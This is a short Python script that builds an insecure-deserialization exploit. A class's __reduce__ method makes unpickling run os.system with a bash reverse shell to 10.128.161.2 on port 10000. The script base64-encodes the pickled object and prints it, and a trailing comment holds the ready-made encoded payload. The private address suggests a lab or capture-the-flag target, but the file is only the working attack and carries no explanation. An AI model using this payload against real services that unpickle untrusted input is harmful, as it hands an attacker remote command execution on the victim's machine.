import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.128.161.2/10000 0>&1'",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)

#gAWVUAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEyOC4xNjEuMi8xMDAwMCAwPiYxJ5SFlFKULg==